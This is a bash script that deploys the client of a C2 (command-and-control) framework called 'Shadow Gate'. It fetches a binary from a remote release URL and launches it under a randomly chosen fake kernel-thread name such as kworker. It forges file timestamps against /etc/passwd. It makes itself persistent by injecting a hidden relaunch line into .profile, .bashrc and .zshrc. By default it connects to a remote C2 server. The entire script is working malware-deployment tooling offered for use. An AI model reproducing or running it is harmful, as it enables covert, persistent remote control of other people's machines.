#!/usr/bin/env bash

# ═══════════════════════════════════════════════════════════════════════════════
# Rust C2 Framework - Client Deployment System
# ═══════════════════════════════════════════════════════════════════════════════
# 
# A sophisticated deployment framework for Rust C2 client with advanced
# stealth capabilities and persistence mechanisms.
#
# Usage Examples:
#   $ bash deploy.sh
#   $ SECRET="your_secret" bash deploy.sh
#   $ SERVER_URL="http://your-server:8080" SECRET="your_secret" bash deploy.sh
#   $ BINARY_URL="https://example.com/shadowgate-linux-x86_64" SECRET="your_secret" bash deploy.sh

#   $ DEBUG=1 SECRET="your_secret" bash deploy.sh
#
# Environment Variables:
#   SECRET          - Required encryption secret for C2 communication
#   SERVER_URL      - C2 server URL (default: https://gate.haxor-world.org)
#   BINARY_URL      - Custom binary download URL

#   DEBUG           - Enable verbose debugging output
#   NO_INSTALL      - Skip persistence installation
#   STEALTH_MODE    - Enable stealth features (default: enabled)
#
# ═══════════════════════════════════════════════════════════════════════════════

[[ -z $ERR_LOG ]] && ERR_LOG="/dev/null"

RED="\033[31m" 
GREEN="\033[32m" YELLOW="\033[33m" BLUE="\033[34m"
MAGENTA="\033[35m" CYAN="\033[36m" WHITE="\033[37m" BLACK="\033[30m"
GRAY="\033[90m" BRIGHT_RED="\033[91m" BRIGHT_GREEN="\033[92m" BRIGHT_YELLOW="\033[93m"
BRIGHT_BLUE="\033[94m" BRIGHT_MAGENTA="\033[95m" BRIGHT_CYAN="\033[96m" BRIGHT_WHITE="\033[97m"
BOLD="\033[1m" DIM="\033[2m" UNDERLINE="\033[4m" BLINK="\033[5m"
RESET="\033[0m"

print_status() {
    echo -e "${BRIGHT_CYAN}${BOLD}[*]${RESET} ${BRIGHT_WHITE}${1}${RESET}"
}

print_progress() {
	[[ -n "${DEBUG}" ]] && return
    	echo -ne "${BRIGHT_BLUE}${BOLD}[*]${RESET} ${BRIGHT_WHITE}"
	echo -n "$1"
	n=${#1}
	echo -n " "
	for ((i=0; i<60-n; i++))
	do
	  echo -ne "${DIM}${GRAY}.${RESET}"
  	done
}

print_warning() {
  echo -e "${BRIGHT_YELLOW}${BOLD}[!]${RESET} ${BRIGHT_YELLOW}${1}${RESET}"
}

print_error() {
  echo -e "${BRIGHT_RED}${BOLD}[-]${RESET} ${BRIGHT_RED}${1}${RESET}"
}

print_fatal() {
  echo -e "${BRIGHT_RED}${BOLD}[!] FATAL:${RESET} ${BRIGHT_RED}$1${RESET}\n"
  exit 1
}

print_good() {
  echo -e "${BRIGHT_GREEN}${BOLD}[+]${RESET} ${BRIGHT_GREEN}${1}${RESET}"
}

print_debug() {
  if [[ -n "${DEBUG}" ]]; then
    echo -e "${DIM}${GRAY}[DEBUG]${RESET} ${GRAY}${1}${RESET}"
  fi
}

print_ok(){
	[[ -z "${DEBUG}" ]] && echo -e " ${BRIGHT_GREEN}${BOLD}[OK]${RESET}"
}

print_fail(){
	[[ -z "${DEBUG}" ]] && echo -e " ${BRIGHT_RED}${BOLD}[FAIL]${RESET}"
}

must_exist() {
  for i in "$@"; do
  	command -v "$i" &>"$ERR_LOG" || print_fatal "$i not installed! Exiting..."
  done
}

## Handle SIGINT
exit_on_signal_SIGINT () {
	print_error "Script interrupted!"
  	clean_exit
}

exit_on_signal_SIGTERM () {
	print_error "Script interrupted!"
	clean_exit
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

# Remove all artifacts and exit
clean_exit() {
	[[ -f "$CLIENT_PATH" ]] && rm -f "$CLIENT_PATH" &>/dev/null
	exit 1
}

# Create a directory if it does not exist and fix timestamp
xmkdir() {
	mkdir -p "$1" &>"$ERR_LOG" || return 1
	touch -r "$2" "$1" || return 1
	true
}

get_random_kernel_proc() {
  proc_name_arr=(
    "[migration/0]"
    "[rcu_gp]"
    "[rcu_par_gp]"
    "[kthreadd]"
    "[kworker/0:0H]"
    "[mm_percpu_wq]"
    "[ksoftirqd/0]"
    "[migration/1]"
    "[rcu_preempt]"
    "[rcu_sched]"
    "[watchdog/0]"
    "[watchdog/1]"
    "[kcompactd0]"
    "[ksmd]"
    "[khugepaged]"
    "[kintegrityd]"
    "[kblockd]"
    "[tpm_dev_wq]"
    "[ata_sff]"
    "[md]"
    "[edac-poller]"
    "[devfreq_wq]"
    "[kswapd0]"
    "[kthrotld]"
    "[irq/24-pciehp]"
    "[acpi_thermal_pm]"
    "[scsi_eh_0]"
    "[scsi_tmf_0]"
    "[scsi_eh_1]"
    "[scsi_tmf_1]"
    "[ipv6_addrconf]"
    "[kstrp]"
  )
  local proc_name
  proc_name=$(pgrep -alu root "kworker"|shuf -n 1|cut -d' ' -f2-)
  [[ -z $proc_name ]] && proc_name="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"
  echo -n "$proc_name"
}

detect_arch() {
	case $(uname -m) in
		("x86_64")
			echo -n "x86_64"
			;;
		*)
			print_fatal "Unsupported OS architecture! Exiting..."
			;;
	esac
}

detect_os() {
	case $(uname -s) in
		("Linux")
			echo -n "linux"
			;;
		*)
			print_fatal "Unsupported OS! Exiting..."
			;;
	esac
}

# Test if directory can be used to store executable
check_exec_dir(){
	[[ ! -d "$(dirname "$1")" ]] && print_debug "$1 is not a directory!" && return 1
	[[ ! -w "$1" ]] && print_debug "$1 directory not writable!" && return 1;
	[[ ! -x "$1" ]] && print_debug "$1 directory not executable!" && return 1;
	return 0;
}

# inject a string into the 2nd line of a file and retain PERM/TIMESTAMP
inject_to_file()
{
	local fname="$1"
	local inject="$2"
	head -n 1 "$fname" | grep -q "#!" && head -n 1 "$fname" > "${fname}_"
	echo "$inject" >> "${fname}_"
	cat "$fname" >> "${fname}_"
	mv "${fname}_" "$fname" &>"$ERR_LOG" || return 1
	touch -r "/etc/passwd" "$fname"
}

create_client_dir() {
	local current_dir="$PWD"
	
	if check_exec_dir "$current_dir"; then
		echo -n "$current_dir"
		return
	fi
	
	print_fatal "Current directory is not writable or executable! Exiting..."
}

# Download binary from URL
download_binary() {
	local target_path="$1"
	local download_url="$2"
	
	# Set default download URL if not provided
	download_url="https://github.com/Haxor-World/Shadow-Gate/releases/download/1.0.0/client-${OS_NAME}-${OS_ARCH}"
	
	print_debug "Downloading binary from: $download_url"
	print_debug "Target path: $target_path"
	
	# Try curl first, then wget
	if command -v curl &>/dev/null; then
		curl -fsSL "$download_url" -o "$target_path" &>"$ERR_LOG" || return 1
	elif command -v wget &>/dev/null; then
		wget -q "$download_url" -O "$target_path" &>"$ERR_LOG" || return 1
	else
		print_fatal "Neither curl nor wget found! Cannot download binary."
	fi
	
	# Make executable and fix timestamps
	chmod +x "$target_path" || return 1
	touch -r "/etc/passwd" "$target_path" &>"$ERR_LOG"
	touch -r "/etc" "$(dirname "$target_path")" &>"$ERR_LOG"
	
	return 0
}

exec_hidden() {
	# Check if client is already running to prevent double execution
	if pgrep -f "${PROC_HIDDEN_NAME}" >/dev/null 2>&1; then
		print_debug "Client already running with process name: ${PROC_HIDDEN_NAME}"
		return 0
	fi
	
	# Validate required variables
	if [[ -z "${SECRET}" ]]; then
		print_error "Missing required SECRET environment variable"
		return 1
	fi
	
	# Set environment variables for client
	export SECRET="${SECRET}"
	[[ -n "${SERVER_URL}" ]] && export SERVER_URL="${SERVER_URL}"
	
	set +m; exec -a "${PROC_HIDDEN_NAME}" ${CLIENT_PATH} &
	disown -a &> "$ERR_LOG"
}

install_init_scripts() {
	inject_targets=(
		"$HOME/.profile"
		"$HOME/.bashrc"
		"$HOME/.zshrc"
	)
	local success=""
	
	# Validate required variables before injection
	if [[ -z "${SECRET}" ]]; then
		print_error "Missing required SECRET environment variable for injection"
		return 1
	fi
	
	# Check if Shadow Gate with same process name is already installed
	for target in "${inject_targets[@]}"; do
		[[ ! -f "$target" ]] && continue
		if grep -q "${PROC_HIDDEN_NAME}" "$target" &>"$ERR_LOG"; then
			print_status "!! WARNING !! Shadow Gate client with process name '${PROC_HIDDEN_NAME}' already installed via $(basename "$target")"
			print_status "Installation aborted to prevent conflicts"
			return 1
		fi
	done
	
	# Build environment variables string
	local env_vars="SECRET='${SECRET}'"
	[[ -n "${SERVER_URL}" ]] && env_vars="${env_vars} SERVER_URL='${SERVER_URL}'"
	INJECT_LINE="
if ! pgrep -f '${PROC_HIDDEN_NAME}' >/dev/null 2>&1; then
	set +m; HOME=$HOME ${env_vars} $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${CLIENT_PATH}\" &>/dev/null &
fi"
	
	for target in "${inject_targets[@]}"; do
		[[ ! -f "$target" ]] && continue
		print_progress "Installing access via $(basename "$target")"
		if inject_to_file "$target" "$INJECT_LINE"; then
			print_ok 
			success=1 
		else
			print_fail
		fi
	done
	[[ -z $success ]] && return 1
	return 0
}

install() {
	if [[ -n $NO_INSTALL ]]; then
		print_status "NO_INSTALL is set. Skipping installation." && return 0
	fi
	
	print_progress "Installing Rust C2 client permanently" && print_ok
  
	local is_installed=false
	
	install_init_scripts && is_installed=true
	[[ "$is_installed" = true ]] && return 0
	return 1
}

init_vars() {
	# Verbose error logs
	[[ -n "$DEBUG" ]] && ERR_LOG="$(tty)"

	# Docker does not set USER
	[[ -z "$USER" ]] && USER=$(id -un)
	[[ -z "$UID" ]] && UID=$(id -u)
	
	# Set HOME if undefined 
	[[ -z "$HOME" ]] && HOME="$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)"
	[[ ! -d "$HOME" ]] && print_fatal "\$HOME not set. Try 'export HOME=<users home directory>'"
	
	# Set SHELL undefined
	[[ -z "$SHELL" ]] && SHELL="$(grep ^"$(whoami)" /etc/passwd | cut -d: -f7)"
	[[ ! -f "$SHELL" ]] && SHELL="/bin/bash" # Default to bash 
	
	# Set default values
	[[ -z "$SERVER_URL" ]] && SERVER_URL="https://gate.haxor-world.org"
	[[ -z "$STEALTH_MODE" ]] && STEALTH_MODE="1"
	
	# Validate required SECRET
	if [[ -z "$SECRET" ]]; then
		print_fatal "SECRET environment variable is required! Example: SECRET='your_secret' bash deploy.sh"
	fi
}

print_usage() {
	echo -e "\n${BRIGHT_GREEN}${BOLD}╔═══════════════════════════════════════════════════════════════╗${RESET}"
	echo -e "${BRIGHT_GREEN}${BOLD}║                    DEPLOYMENT SUCCESSFUL                     ║${RESET}"
	echo -e "${BRIGHT_GREEN}${BOLD}╚═══════════════════════════════════════════════════════════════╝${RESET}\n"
	echo -e "${BRIGHT_WHITE}${BOLD}Stealth Configuration:${RESET}"
	echo -e "${BRIGHT_WHITE}   Process Name: ${BRIGHT_CYAN}$PROC_HIDDEN_NAME${RESET}"
	echo -e "${BRIGHT_WHITE}   Binary Location: ${BRIGHT_CYAN}$CLIENT_PATH${RESET}"
	echo
}

SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"

must_exist "head" "uname" "grep" "cut" "tr" "touch" "tail" "ps"

if ! command -v curl &>/dev/null && ! command -v wget &>/dev/null; then
	print_fatal "Neither curl nor wget found! Please install one of them to download binaries."
fi

# Display the Shadow Gate banner
print_banner() {
	echo -e "${BRIGHT_CYAN}${BOLD}"
	echo ""
	echo -e "  ${BRIGHT_WHITE}███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗${RESET}"
	echo -e "  ${BRIGHT_WHITE}██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║${RESET}"
	echo -e "  ${BRIGHT_WHITE}███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║${RESET}"
	echo -e "  ${BRIGHT_WHITE}╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║${RESET}"
	echo -e "  ${BRIGHT_WHITE}███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝${RESET}"
	echo -e "  ${BRIGHT_WHITE}╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ${RESET}"
	echo ""
	echo -e "        ${BRIGHT_YELLOW} ██████╗  █████╗ ████████╗███████╗${RESET}"
	echo -e "        ${BRIGHT_YELLOW}██╔════╝ ██╔══██╗╚══██╔══╝██╔════╝${RESET}"
	echo -e "        ${BRIGHT_YELLOW}██║  ███╗███████║   ██║   █████╗  ${RESET}"
	echo -e "        ${BRIGHT_YELLOW}██║   ██║██╔══██║   ██║   ██╔══╝  ${RESET}"
	echo -e "        ${BRIGHT_YELLOW}╚██████╔╝██║  ██║   ██║   ███████╗${RESET}"
	echo -e "        ${BRIGHT_YELLOW} ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝${RESET}"
	echo ""
	echo -e "${BRIGHT_WHITE}${BOLD}              ◆ Advanced Gate Monitoring v1.0 ◆${RESET}"
}
print_banner

# Init global vars
init_vars
OS_ARCH=$(detect_arch)
OS_NAME=$(detect_os)
CLIENT_DIR_NAME=$(create_client_dir)
RAND_NAME="$(LC_ALL=C tr -dc A-Za-z0-9 </dev/urandom | head -c 8)"
PROC_HIDDEN_NAME="$(get_random_kernel_proc "$OS_NAME")"
CLIENT_PATH="${CLIENT_DIR_NAME}/${RAND_NAME}"

if [[ "$CLIENT_DIR_NAME" =~ ^.*/(tmp|shm).* ]]; then
  print_warning "Created a temp client directory!" 
  print_warning "Access will be lost after a reboot..."  
fi

print_progress "Downloading Shadow Gate client binary"

if download_binary "$CLIENT_PATH" "$BINARY_URL"; then 
  print_ok 
else
  print_fail 
  print_fatal "Binary download failed! Exiting..."
fi

install ||  print_error "Permanent install methods failed! Access will be lost after reboot."

print_progress "Triggering initial execution"
if exec_hidden; then 
  print_ok 
else 
  print_fail 
  print_error "Initial execution failed! Try starting client manually."
fi

print_usage
